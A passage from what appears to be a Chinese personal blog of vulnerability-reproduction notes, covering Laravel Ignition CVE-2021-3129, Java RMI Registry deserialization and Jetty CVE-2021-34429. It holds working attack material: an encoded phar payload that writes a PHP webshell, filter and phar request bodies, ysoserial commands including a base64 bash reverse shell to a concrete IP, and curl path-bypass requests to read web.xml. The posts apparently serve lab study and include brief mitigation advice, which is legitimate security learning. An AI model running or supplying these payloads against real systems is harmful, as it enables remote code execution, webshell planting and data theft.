&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=32=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=41=00=4C=00=66=00=39=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=33=00=4E=00=42=00=31=00=67=00=64=00=5A=00=36=00=2B=00=50=00=59=00=72=00=34=00=36=00=79=00=42=00=34=00=71=00=67=00=63=00=67=00=4F=00=4C=00=74=00=59=00=37=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>5.清除干扰字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>6.执行反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>发送完以上数据包后，蚁剑进行连接，成功连接</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910203844643.png" alt="image-20230910203844643"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</p>
<p>github地址：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
<p><img src="https://img-blog.csdnimg.cn/4459b03ef53f41acab26d864a976a9ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910204850323.png" alt="image-20230910204850323"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用了file_get_contents()去读取了一个可控的路径参数，所以这里可以通过phar://协议去触发phar反序列化</p>
<p>既然路径可控，那么首先想到的就是log文件，虽然log不能直接被当做php执行，但是有了file_get_contents+phar就可以；我们修改可控的viewfile参数后看看log中是什么样的</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/ez9hcsiijj.png" alt="img"></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/kyb4hlb7rv.png" alt="img"></p>
<p>可以看到日志中写入了3次test，那么怎么才能只保留我们最后的一个payload呢，这里就可以使用filter做清空字符以及去除多余字符的方法。</p>
<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.使用白名单限制相关web项目的访问来降低风险；</p>
<p>2.将 Laravel 框架升级至8.4.3及其以上版本，或者将facade ignition组件升级至 2.5.2 及其以上版本。</p>
<p><strong>参考链接：</strong></p>
<p><a href="https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA</a></p>
<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p>
<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/12/09/Java RMI Registry 反序列化漏洞(=jdk8u111)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/12/09/Java RMI Registry 反序列化漏洞(=jdk8u111)/" itemprop="url">Java RMI Registry 反序列化漏洞(<=jdk8u111)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-12-09T21:00:01+08:00">
                2022-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><blockquote>
<p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
<p>RMI 的基本工作原理如下：</p>
<ol>
<li>定义接口：首先需要定义一个接口，其中包含要在远程计算机上调用的方法。接口的实现类将会被注册到 RMI 服务端。</li>
<li>编写客户端和服务器端代码：在客户端代码中，通过 RMI 远程引用获取远程对象的实例。然后，就可以通过远程对象来调用远程方法。在服务器端代码中，创建一个实现了接口的类，并注册该实例到 RMI 服务端。</li>
<li>对象序列化与传输：在 RMI 中，远程方法的参数和返回值可以是可序列化的对象。在方法调用时，参数对象会通过网络传输到远程服务器，服务器执行相应的方法，并将结果返回给客户端。</li>
<li>RMI 注册中心：RMI 注册中心（Registry）是一个用于维护远程对象引用的命名服务，在客户端和服务器端之间进行对象的绑定与查找。</li>
<li>安全性：RMI 支持对远程调用进行安全验证和授权，可以通过配置安全策略文件和使用数字证书来确保通信的安全性。</li>
</ol>
<p>使用 RMI 可以方便地实现分布式系统中的组件通信和方法调用，使得远程计算机上的对象就像本地对象一样被访问。但需要注意的是，RMI 依赖于网络通信，因此在设计和实现时需要考虑网络延迟、故障处理和安全性等因素。</p>
</blockquote>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能（虽然大多数情况不允许远程bind），在bind过程中，伪造Registry接收到的序列化数据（实现了Remote接口或动态代理了实现了Remote接口的对象），使Registry在对数据进行反序列化时触发相应的利用链（环境用的是commons-collections:3.2.1）。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令编译及启动RMI Registry和服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker-compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>其中，<code>your-ip</code>是服务器IP，客户端会根据这个IP来连接服务器。</p>
<p>环境启动后，RMI Registry监听在1099端口。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><strong>commons-collections:3.2.1</strong> 是 <strong>Apache Commons Collections</strong> 的一个特定发布版本。Apache Commons Collections 是一个开源的Java类库，提供了许多实用的集合类、迭代器、比较器、转换器等工具，它们可以帮助简化和改进 Java 中集合操作的编程。这个库包含了丰富的功能，如排序、过滤、遍历、转换等，并且还提供了一些特殊的集合类，如支持多值映射的 MultiMap、可变大小的 BitSet 等。</li>
<li><strong>RMIRegistryExploit</strong> 是一种利用 Java 远程方法调用（Remote Method Invocation，RMI）注册表的漏洞进行攻击的技术或工具。RMI 注册表是一个 Java RMI 系统中的核心组件，它充当着远程对象的注册中心，使客户端能够在网络上查找远程对象并进行远程方法调用。</li>
</ul>
<p>dnslog生成一个DNS   <a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p>
<p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击，攻击机执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182956085.png" alt="image-20230910182956085"></p>
<p>Registry会返回报错，但命令会正常执行。可以看到dnslog成功接收请求</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182722694.png" alt="image-20230910182722694"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183359239.png" alt="image-20230910183359239"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183436780.png" alt="image-20230910183436780"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/11/17/Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/11/17/Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429/" itemprop="url">Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-17T21:00:01+08:00">
                2022-11-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429"></a>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
<p>Jetty在9.4.40后修复了因为<code>%2e</code>导致的敏感信息泄露漏洞<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164" target="_blank" rel="noopener">CVE-2021-28164</a>，但这个修复是不完全的，通过下面三种方式可以进行绕过：</p>
<ul>
<li>unicode形式URL编码：<code>/%u002e/WEB-INF/web.xml</code></li>
<li><code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></li>
<li><code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></li>
</ul>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm</a></li>
<li><a href="https://xz.aliyun.com/t/10039" target="_blank" rel="noopener">https://xz.aliyun.com/t/10039</a></li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9.4.37 ≤ Eclipse Jetty ≤ 9.4.42</span><br><span class="line">10.0.1 ≤ Eclipse Jetty ≤ 10.0.5</span><br><span class="line">11.0.1 ≤ Eclipse Jetty ≤ 11.0.5</span><br></pre></td></tr></table></figure>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Jetty 9.4.40：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>服务启动后，访问<code>http://your-ip:8080</code>可以查看到一个example页面</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><p>“%u002e” 是一个 Unicode 转义序列，表示 ASCII 字符集中的句点（”.”）。</p>
<p>Unicode 转义序列是一种将 Unicode 字符表示为 ASCII 字符的方法。它使用 “%u” 后跟四个十六进制数字来表示字符的 Unicode 编码值。</p>
<p>对于 “%u002e” 转义序列，其中 “002e” 是句点字符（”.”）的 Unicode 编码值。在 ASCII 字符集中，句点（”.”）的 Unicode 编码值为 002E。</p>
<p>注意，转义序列 “%u002e” 是一种字符表示形式，并不影响该字符的实际含义或用途。在常规的文本处理中，直接使用句点字符（”.”）即可，无需使用转义序列。</p>
</li>
<li><p>“%00” 是 URL 编码中表示空字节（null byte）的一种方式。</p>
<p>URL 编码用于在 URL 中表示特殊字符和非 ASCII 字符。它通过将字符转换为一系列百分号（%）后跟两个十六进制数字的形式来表示。</p>
<p>在 “%00” 中，”00” 是空字节的十六进制表示。空字节是以二进制值 00000000 表示的特殊字符，它在字符串中通常表示字符串的结束或作为字符串中的分隔符。</p>
<p>空字节在 URL 编码中通常被视为字符串的结束符号</p>
</li>
</ul>
<p>直接访问<code>/WEB-INF/web.xml</code>将会返回404页面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 123.56.181.14:8080/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184941627.png" alt="image-20230910184941627"></p>
<p>1.使用<code>/%u002e</code>来绕过限制下载web.xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/%u002e/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190205075.png" alt="image-20230910190205075"></p>
<p>2.<code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/.%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190319051.png" alt="image-20230910190319051"></p>
<p>3.<code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/a/b/..%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190412366.png" alt="image-20230910190412366"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/header.jpg"
                alt="biobby" />
            
              <p class="site-author-name" itemprop="name">biobby</p>
              <p class="site-description motion-element" itemprop="description">有些事情想着想着就错过了，做着做着就成功了</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">biobby</span>

  
</div>


<!-- <div class="powered-by">由  强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash;  v5.1.4</div>
-->




<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

